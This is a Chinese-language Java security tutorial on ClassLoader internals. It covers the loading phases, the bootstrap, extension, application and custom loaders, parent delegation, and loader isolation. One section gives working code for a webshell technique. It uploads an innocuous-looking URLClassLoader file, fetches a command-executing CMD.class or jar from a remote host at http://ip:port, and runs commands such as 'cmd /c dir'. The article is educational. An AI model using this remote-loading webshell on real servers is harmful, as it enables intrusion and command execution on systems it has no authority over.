前言
==

审核能过的话会有续集？应该是的

原谅我的渣英语，命名都是随便的

本篇所有代码及工具均已上传至gayhub：<https://github.com/yq1ng/Java>

ClassLoader概述
=============

Java这语言虽然代码很长，但是很多函数或者类都可以看名知意。ClassLoader就是将Java类文件（\*.class）加载到 jvm（Java虚拟机） 里面，jvm通过执行class文件的字节码来执行Java程序。

Java源代码（\*.java）被 javac 编译器编译后以字节码的形式保存在 class文件中然后再由 jvm 执行。

执行程序时，不会一次性把所有class文件都加载到 jvm 内存里，而是按需加载，只有class文件被加载到内存中它才能被其他class文件引用。怎么按需加载呢？ JVM规范允许类加载器在预料到某些类要被使用时提前加载它，而不必等到首次被主动调用再去加载，如果在加载过程中遇到错误，那么类加载器要在它被首次主动调用时主动报告错误（LinkageError）

jvm 启动时加载 class 文件的两种方式：

- 隐式加载：JVM 自动加载需要的类到内存中
- 显式加载：通过 `class.forName()` 动态加载 class文件到 jvm 中

类的加载过程及生命周期
===========

类加载的五个阶段
--------

![image-20210614163334909](https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210614163335.png)

这个流程顺序是固定的：加载 -&gt; 验证 -&gt; 准备 -&gt; 初始化 -&gt; 卸载 ，这五个阶段是类加载器必须遵守的。

为什么流程中解析阶段跳过了？为了支持Java的动态绑定，某些解析过程会在初始化后也就是调用时再次解析，这个过程叫 重载解析。不知道Java动态绑定？传送门：[Java静态绑定与动态绑定 ](https://blog.csdn.net/zhangjk1993/article/details/24066085)

> 可以被重写的是动态绑定，不能被重写的是静态绑定？

1. 加载：通过全限定名（包名 + 类名）来获取二进制字节流，并在内存中生成代表此类的 Class对象作为访问此类入口
2. 验证：本阶段目标是确保 Class文件的字节流内信息符合当前虚拟机要求，且不会危害虚拟机安全。可以使用`-Xverifynone` 参数来关闭大多数验证以缩短类加载时间
    
    四个验证步骤（取自 [JVM 类加载](https://dunwu.github.io/javacore/jvm/jvm-class-loader.html#_2-2-%E4%BA%8C-%E9%AA%8C%E8%AF%81)）：
    
    
    - **文件格式验证** - 验证字节流是否符合 Class 文件格式的规范，并且能被当前版本的虚拟机处理。
    - **元数据验证** - 对字节码描述的信息进行语义分析，以保证其描述的信息符合 Java 语言规范的要求。
    - **字节码验证** - 通过数据流和控制流分析，确保程序语义是合法、符合逻辑的。
    - **符号引用验证** - 发生在虚拟机将符号引用转换为直接引用的时候，对类自身以外（常量池中的各种符号引用）的信息进行匹配性校验。
3. 准备：为类变量（static）和全局变量（static final）分配内存并初始化为默认值，内存区在方法内存区
    
    
    - 实例变量在此阶段不会分配内存，其会在对象实例化时分配到 Java堆里面
    - 初始化值一般为数据类型默认零值（0，false，null）
    - 被 final修饰的变量不会被分配内存与初始化，该变量在编译时已经被分配内存空间，其值为 null ，所以 final 变量可以声明时赋值，也可以在使用前进行显式赋值
    - 全局变量在准备阶段已被赋值为所指定的值。如`public static final int a = 1;`在准备阶段就会被赋值为 1 而不是 0 ，如果没有显式赋值则编译器会报错
    - 类变量在准备阶段会被赋值为默认零值。`public static int a = 1;` 在准备阶段会赋值为 0（默认零值）
    - 局部变量必须在使用前显式赋值否则报错。为啥？本篇说的是类加载，在**JVM类加载**后还会有**字节码执行**的阶段，而方法内部的代码是在字节码执行的阶段运行的，所以局部变量无默认值，必须显式赋值。说人话就是局部变量总量大，每个都要初始化内存开销大不说，需要用到默认值的情况少之又少，而粗心的程序员也不少，干脆强制让你赋值，不然就报错，这样也能减少bug的产生，何乐而不为。说的多了。。。
4. 解析：将常量池的符号引用替换为直接引用
    
    
    - 符号引用（静态）：符号可以是任何形式的字面量（固定值，如`public static final String a = "b";`的 b 就是字面量，必须用final修饰），只要其能无歧义的定位到目标。
        
        符号引用分为三类：
        
        
        - 类和接口的全限定名
        - 字段的名称和描述符：字段名如上面的 `a` ，描述符 `String`
        - 方法的名称和描述符：方法名 `test` 和描述符 `()`
    - 直接引用（动态）：将.class文件加载到内存中之后， jvm 会将符号引用转化为代码在内存中实际的内存地址，这就是直接引用，也就是类加载中的动态绑定
5. 初始化：为类的静态变量赋予正确的初始值；如果该类未被加载或链接，则开始加载此类；若该类直接父类未初始化，则先初始化其父类（父类的静态语句块是优于子类变量赋值操作的）
    
    关于第三条，看这个代码
    
    ```java
    public class Test{
       static class A {
           public static int a = 1;
               static {
                   a = 2;
               }
       }
    
       static class B extends A {
           public static int b = a;
       }
    
       public static void main(String[] args) {
           System.out.println(B.b);  // 输出结果是父类中的静态变量 a 的值，也就是 2
       }
    }
    ```
    
    类初始化的时机是在该类被主动引用的时候。主动引用分为以下六种：
    
    
    - **创建类的实例**： `new` 对象
    - **访问静态变量**：访问某个类或接口的静态变量，或者对该静态变量赋值
    - **访问静态方法**
    - **反射**：如`Class.forName()`
    - **初始化子类**： 初始化某个类的子类，则其父类也会被初始化
    - **启动类** ：Java 虚拟机启动时被标明为启动类的类（`Java Test`），直接使用`java.exe`命令来运行某个主类
    
    不知道你们遇到过这个报错没：**错误: 非法前向引用**
    
    ```java
    public class Test {
       static {
           i = 0;
           System.out.print(i); //  编译报错：错误: 非法前向引用
       }
       static int i = 1;
    }
    ```
    
    > 编译乱码可以这样：`javac -encoding UTF-8 .\Test.java`，指定编码即可
    
    为何？参考 [Restrictions on the use of Fields during Initialization](http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.3.2.3)，满足以下四点，成员变量声明必须在使用之前
    
    
    - 出现在静态变量的初始化或静态初始化块中
    - 使用不在赋值表达式左边
    - 使用是通过简单名称
    - 使用包含了最内层的类/接口
    
    也就是在`static int i = 1;`声明之前的静态块中使用，其只能出现在赋值表达式左侧（那不就是为其赋值嘛。。），除非带上类名，例如下面这样就不会报错
    
    ```java
    public class Test {
       static {
           i = 0;
           System.out.print(Test.i);    //  带上类名就不会有编译报错
       }
       static int i = 1;
    }
    ```
    
    总结：在类里边的静态/非静态语句块中，只能访问到在块之前定义的变量，在块之后定义的变量在块中只能进行赋值，但是不能访问

类加载的实现
------

在`java/lang/ClassLoader.java:401`中有这个函数：`loadClass()`

```java
protected Class<?> loadClass(String name, boolean resolve)
        throws ClassNotFoundException
    {
        //  线程锁
        synchronized (getClassLoadingLock(name)) {
            // First, check if the class has already been loaded
            //  检查是否已经加载
            Class<?> c = findLoadedClass(name);
            if (c == null) {
                long t0 = System.nanoTime();
                try {
                    //  检查父类是否为空，不是则调用父类loadClass()，后面有说原因为何不自己先调用
                    if (parent != null) {
                        c = parent.loadClass(name, false);
                    } else {
                        //  父类为空则调用引导类加载器，findBootstrapClassOrNull跟踪到最后是
                        //  return null if not found
                      //    private native Class<?> findBootstrapClass(String name);
                        c = findBootstrapClassOrNull(name);
                    }
                } catch (ClassNotFoundException e) {
                    // ClassNotFoundException thrown if class not found
                    // from the non-null parent class loader
                }

                if (c == null) {
                    // If still not found, then invoke findClass in order
                    // to find the class.
                    //  如果仍未找到class则调用 findclass()，但是改方法为空，是需要用户自行实现的
                    long t1 = System.nanoTime();
                    c = findClass(name);

                    // this is the defining class loader; record the stats
                    //  记录加载
                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);
                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);
                    sun.misc.PerfCounter.getFindClasses().increment();
                }
            }
            if (resolve) {
                //  链接此类，如果已被链接则返回简单地址，否则进行解析，这一点上面也提到了-加载后的解析
                resolveClass(c);
            }
            return c;
        }
    }
```

上面说过，class Loader会把class转为对象，这个方法也在这个java文件里（574行），名为`defineClass()`

```java
    @Deprecated
    protected final Class<?> defineClass(byte[] b, int off, int len)
        throws ClassFormatError
    {
        return defineClass(null, b, off, len, null);
    }
```

这个函数上面的注释写的很全，可以自己看看

四种ClassLoader
=============

絮絮叨叨的终于到了今天的主角 --- ClassLoader，其分为四种加载器：引导类加载器（BootstrapClassLoader）、扩展类加载器（ExtensionsClassLoader）、应用程序类加载器（AppClassLoader）、自定义类加载器（UserDefineClassLoader），前三个并不是继承关系，是父类委托关系（parent-delegation -- 类加载父亲委托）

引导类加载器（BootstrapClassLoader）
----------------------------

> 负责加载 JVM 自身工作所需要的类，加载核心Java库
> 
> 加载文件为：`%JAVA_HOME%\lib` 或 被`-Xbootclasspath` 参数所指定的路径，此路径内名字不符合的类库不会加载，例如`rt.jar`

这是Java最顶层的加载器，没有父类，其用C++实现，打印父类加载器为 null，并且嵌入到JVM内，不能被直接引用。自定义加载器若想委派BootstrapClassLoader直接使用null替代即可

它具体加载什么了呢？看代码，第一种用了Java反射机制，下个篇章会说

```java
package com.yq1ng;

import java.net.URL;

/**
 * @author ying
 * @Description
 * @create 2021-06-15 10:51 AM
 */

public class BootStrapLoadInfo {
    public static void main(String[] args){
        URL[] urls = sun.misc.Launcher.getBootstrapClassPath().getURLs();
        for (int i = 0; i < urls.length; i++) {
            System.out.println(urls[i].toExternalForm());
        }
        System.out.println("========================================================");
        System.out.println(System.getProperty("sun.boot.class.path"));
    }
}
/**
 * output
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/resources.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/rt.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/sunrsasign.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/jsse.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/jce.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/charsets.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/jfr.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/classes
    ========================================================
    C:\Program Files\Java\jdk1.8.0_151\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_151\jre\lib\rt.jar;C:\Program Files\Java\jdk1.8.0_151\jre\lib\sunrsasign.jar;C:\Program Files\Java\jdk1.8.0_151\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_151\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_151\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_151\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_151\jre\classes
 */
```

验证：使用`rt.jar!/java/lang/Object.class`获取其父类加载器

![image-20210615111513709](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-71041020caa9a5c0fea53ee55e2da6ae21f60c59.png)

关于这个引导类加载器偶然看见一个笑死的名字 --- 祖宗类加载器 。。。

![image-20210615110244793](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c8ba3558d59875ca00436530a4032b7c9023a9ad.png)

扩展类加载器（ExtensionsClassLoader）
-----------------------------

> 加载核心类的扩展，以适配平台运行的程序
> 
> 加载文件为：`%JAVA_HOME%\lib\ext` 或被`java.ext.dir` 系统变量所指定路径中的所有类库

```java
package com.yq1ng.ExtensionsClassLoader;

import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author ying
 * @Description
 * @create 2021-06-15 11:15 AM
 */

public class ExtensionsLoaderInfo {
    public static void main(String[] args) {
        URLClassLoader extClassLoader = (URLClassLoader) ClassLoader.getSystemClassLoader().getParent();
        URL[] urls = extClassLoader.getURLs();
        for (URL url : urls) {
            System.out.println(url);
        }
    }
}
/**
 * output
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/access-bridge-64.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/cldrdata.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/dnsns.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/jaccess.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/jfxrt.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/localedata.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/nashorn.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/sunec.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/sunjce_provider.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/sunmscapi.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/sunpkcs11.jar
    file:/C:/Program%20Files/Java/jdk1.8.0_151/jre/lib/ext/zipfs.jar
*/
```

很明显，此加载器加载了`%JAVA_HOME%/jre/lib/ext/`目录下的Java类

验证：就取第一个加载的类看看

![image-20210615112358752](https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210615112358.png)

应用程序类加载器（AppClassLoader）
------------------------

> 加载用户类路径指定类库
> 
> 加载文件为：`CLASSPATH`路径下指定文件

直译是上面这个，但是这个类加载器是 `ClassLoader` 中的 `getSystemClassLoader()` 方法的返回值，所以也叫系统类加载器

程序运行一般默认使用此加载器

代码用命令行运行更直观，idea会加上参数，顺便把包名去掉，不然会报**错误: 找不到或无法加载主类 AppLoaderInfo**

![image-20210615114036769](https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210615114037.png)

![image-20210615114146452](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cfb3547338c520aaa5c2ec7a81a2ddda8e8a375e.png)

自定义类加载器（UserDefineClassLoader）
------------------------------

> 通过继承`java.lang.ClassLoader.class` 实现自定义的类加载器

应用广泛，典型的有 Tomcat 的servlet隔离技术，每个 wabapp都有自己的 classloader；Spring框架；热部署等等，具体可以看[Java 类加载器（ClassLoader）的实际使用场景有哪些？](https://www.zhihu.com/question/46719811)

这里写一个加载外部类的dom。

待加载类，写完后记得用 `javac` 编译，类加载器加载的是字节码文件（.class）

```java
/**
 * @author ying
 * @Description
 * @create 2021-06-15 4:52 PM
 */

public class Test {
    public static void test(String parameter) {
        System.out.println("External class was successfully loaded!!!");
        System.out.println("The passing parameter is " + parameter);
    }
}

```

自定义类加载器

```java
package com.yq1ng.UserDefineClassLoader;

import java.io.*;

/**
 * @author ying
 * @Description
 * @create 2021-06-15 4:55 PM
 */

public class myClassLoader extends ClassLoader {
    private String classPath;
    public myClassLoader(String classPath){
        this.classPath = classPath;
    }

    private String getFileName(String fileName){
        int index = fileName.lastIndexOf('.');
        if (index == -1){
            return fileName + ".class";
        }else {
            return fileName.substring(index + 1) + ".class";
        }
    }

    //  重写 findClass
    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        String fileName = getFileName(name);
        File file = new File(classPath, fileName);
        try {
            FileInputStream fileInputStream = new FileInputStream(file);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int len = 0;
            try {
                while ((len = fileInputStream.read()) != -1) {
                    byteArrayOutputStream.write(len);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            byte[] data = byteArrayOutputStream.toByteArray();
            fileInputStream.close();
            byteArrayOutputStream.close();
            return defineClass(name, data, 0, data.length);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return super.findClass(name);
    }
}
```

测试

```java
package com.yq1ng.UserDefineClassLoader;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * @author ying
 * @Description
 * @create 2021-06-15 5:05 PM
 */

public class testMyClassLoader {
    public static void main(String[] args) {
        //  指定路径
        myClassLoader myClassLoader = new myClassLoader("F:\\");
        try {
            //  指定加载文件名称
            Class c = myClassLoader.loadClass("Test");
            Method[] methods = c.getDeclaredMethods();
            for (Method method : methods) {
                System.out.println("methods: " + method.getName());
            }
            if (c != null) {
                try {
                    Object object = c.newInstance();
                    //  参数为 String ，为c.getDeclaredMethod指定参数类型准备
                    Class[] cArg = new Class[1];
                    cArg[0] = String.class;
                    Method method = c.getDeclaredMethod("test", cArg);
                    method.invoke(object, "yq1ng");
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                } catch (InstantiationException e) {
                    e.printStackTrace();
                } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                }
            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```

![image-20210615172637400](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9004292bfa2ca2eb8f9432074966395d0916f0ea.png)

还有个就是防止反编译的，加密、解密class文件，但这也只是防君子不防“小人”就像base64一样哈哈，可以看[基础补完计划 – Java 类加载器( ClassLoader )](https://www.guildhab.top/2021/03/java%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8-classloader/)，这篇文章也写了很多自定义加载器的示例

parent-delegation model
=======================

很多说法都是双亲委派机制，谷歌、必应翻译是父类委托模型/机制，名称无所谓。先看个流程图

![image-20210615181105796](https://raw.githubusercontent.com/yq1ng/blog/master/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/20210615181108.png)

除了顶层加载器，其余均有父类委托

- **委托阶段**
    
    当一个类加载器需要加载类时，首先判断该类是否已经被加载，如果该类已经被加载就直接返回，如果该类未被加载，则委托给父类加载器。
    
    父类加载器会执行相同的操作来进行判断，直到委托请求到达“引导类加载器（BootstrapClassLoader）”，此时可以确定当前类未被加载，因此需要进入派发阶段，查找并加载该类。
- **派发阶段**
    
    委托到达引导类加载器时如未找到就会进入派发阶段，将其转给子类进行加载。如果都未找到则抛出`ClassNotFoundException`异常并退出

优势
--

- **避免加载重复类**：从流程图可以看出来，父类加载后的类子类不会再加载
- **保证Java核心库安全、防止内存中出现多份相同字节码**：比如`java.lang.Object`存放在`rt.jar`中，如果自定义一个`java.lang.Object`，不会将原有的覆盖，因为自定义的类会由`AppClassLoader`进行加载，向上委托发现已经加载就不会在加载自定义的类了

URLClassLoader 的利用
==================

> 通过 `java.net.URLClassLoader.class` 可以远程加载资源
> 
> 在上传 webshell 的时候如果不想上传执行代码的恶意文件 or 需要过狗，只上传一个 `URLClassLoader` 看起来无危害的文件，然后使用此文件远程加载执行命令的 jar 包或者 class 恶意文件

话不多说，开始搞，先来一个服务器上的恶意 class

```java
import java.io.IOException;

/**
 * @author ying
 * @Description
 * @create 2021-10-30 11:40 AM
 */

public class CMD {
    public static Process exec(String cmd) throws IOException {
        return Runtime.getRuntime().exec(cmd);
    }
}
```

然后，编译一下 `javac .\cmd.java` ，注意：**这个文件不能带包名，把 idea 的包名去掉在编译，否则提示找不到类**，这也容易理解，带上包名（全限定名），ClassLoader 会从本地寻找此 class 文件，当然找不到恶意的。将 `CMD.class` 上传到 vps （或在本地起个服务）；或者上传 jar 包，在 class 文件同级目录下写一个`manifest` 文件（其实文件名随意啦），内容如下（最后一行空行别忘记）：

```php
Manifest-Version: 1.0
Main-Class: addJarPkg

```

生成 jar 包的命令是 `jar -cvfm cmd.jar manifest -C cmd .`

![image-20211030222841093](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20211030222841.png)然后开始写利用类

```java
package com.yq1ng.URLClassLoader;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author ying
 * @Description
 * @create 2021-10-30 11:09 AM
 */

public class badURLClassLoader {
    public static void main(String[] args) {
        try {
            //  定义远程文件 URI
            URL url = new URL("http://ip:port/CMD.class");
//            URL url = new URL("http://ip:port/cmd.jar");
            //  创建 URLClassLoader 对象，并加载 class 类/ jar 包
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
            //  加载远程 class 文件/ jar 包中的 CMD 类
            Class cmdClass = urlClassLoader.loadClass("CMD");
            //  定义需要执行的命令，需要根据客户端（win/linux）进行命令的选择
//            String cmd = "calc";     //  calc 不需要下面的读取结果也可以的
            String cmd = "cmd /c dir";
            //  调用 CMD 类中的 exec 方法，如果是本地的话就相当于：Process process = CMD.exec("calc");
            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);
            //  获取执行结果的输入流
            InputStream inputStream = process.getInputStream();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] bytes = new byte[1024];
            int a = -1;
            //  读取结果
            while ((a = inputStream.read(bytes)) != -1){
                byteArrayOutputStream.write(bytes, 0, a);
            }
            //  输出结果
            System.out.println(byteArrayOutputStream.toString());
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

![image-20211030133837518](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f86ac4c8e846c053b4267e9c63f070b94c23e97a.png)

当然，有时候一个 class 可能满足不了我们，这时候可以修改上面的利用代码，加载 jar 包进行其他姿势。但是我们并不知道服务端加载了那些 jar 包，会不会和我们的冲突/相同？会不会加载远程资源以后造成业务不可逆的毁坏？这就可以介绍 ClassLoader 的隔离机制了

ClassLoader 隔离机制
================

鉴于上面的问题，来看看隔离机制

![image-20211030135708327](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20211030135708.png)

先认识一下 **静态内部类**

```java
package com.yq1ng.IsolationMechanism;

/**
 * @author ying
 * @Description
 * @create 2021-10-30 2:04 PM
 */

public class TestStaticClass {
    public static class A {
        public A() {
            System.out.println("Call the constructor of A~");
        }
        //  普通代码域，在类的每个对象创建的时候调用
        {
            System.out.println("Hello, I'm A~");
        }
    }

    public static void main(String[] args) {
        //  F1. 单独初始化
        A a = new A();
        //  F2. 内部类的初始化
        TestStaticClass.A aa = new TestStaticClass.A();
    }
}
```

![image-20211030141529460](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-15f9ea5dcbee9881758d456a645c45f7d59f244a.png)

实践一下隔离机制，来一个待加载的类，同样需要去掉包名，然后编译为 class

```java
/**
 * @author ying
 * @Description
 * @create 2021-10-30 2:57 PM
 */

public class HelloWord {
    public void hello(){
        System.out.println("Hello Word!");
    }
}
```

接着来一个test

```java
package com.yq1ng.IsolationMechanism;

import java.io.*;

/**
 * @author ying
 * @Description
 * @create 2021-10-30 1:58 PM
 */

public class ClassLoaders {

    public static class ClassLoaderA extends ClassLoader{
        public ClassLoaderA(ClassLoader parrent){
            super(parrent);
        }
        public byte[] getClassData(File file){
            try (InputStream ins = new FileInputStream(file); ByteArrayOutputStream baos = new
                    ByteArrayOutputStream()) {
                byte[] buffer = new byte[4096];
                int bytesNumRead = 0;
                while ((bytesNumRead = ins.read(buffer)) != -1) {
                    baos.write(buffer, 0, bytesNumRead);
                }
                return baos.toByteArray();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return new byte[] {};
        }
        {
            //  需要绝对路径
            File file = new File("F:\\ClassLoader\\src\\main\\java\\com\\yq1ng\\IsolationMechanism\\HelloWord.class");
            byte[] classByte = getClassData(file);
            defineClass("HelloWord", classByte, 0, classByte.length);
        }
    }
    public static class ClassLoaderB extends ClassLoader{
        public ClassLoaderB(ClassLoader parrent){
            super(parrent);
        }
        public byte[] getClassData(File file){
            try (InputStream ins = new FileInputStream(file); ByteArrayOutputStream baos = new
                    ByteArrayOutputStream()) {
                byte[] buffer = new byte[4096];
                int bytesNumRead = 0;
                while ((bytesNumRead = ins.read(buffer)) != -1) {
                    baos.write(buffer, 0, bytesNumRead);
                }
                return baos.toByteArray();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return new byte[] {};
        }
        {
            //  需要绝对路径
            File file = new File("F:\\ClassLoader\\src\\main\\java\\com\\yq1ng\\IsolationMechanism\\HelloWord.class");
            byte[] classByte = getClassData(file);
            defineClass("HelloWord", classByte, 0, classByte.length);
        }
    }

    public static void main(String[] args) throws Exception {
        // 父类加载器
        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();
        // A类加载器
        ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);
        // B类加载器
        ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);
        // 使用A/B类加载器加载同一个类
        Class<?> a1 = Class.forName("HelloWord", true, aClassLoader);
        Class<?> a2 = Class.forName("HelloWord", true, aClassLoader);
        Class<?> b = Class.forName("HelloWord", true, bClassLoader);
        //  比较
        System.out.println("aClass == aaClass：" + (a1 == a2));
        System.out.println("aClass == bClass：" + (a1 == b));
    }
}
```

![image-20211030154831824](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e79d9f2a5a6e4dbf46131236afecf2c7aed67064.png)

所以可以自定一个简单的类加载器来解决 jar 包冲突的烦恼

END
===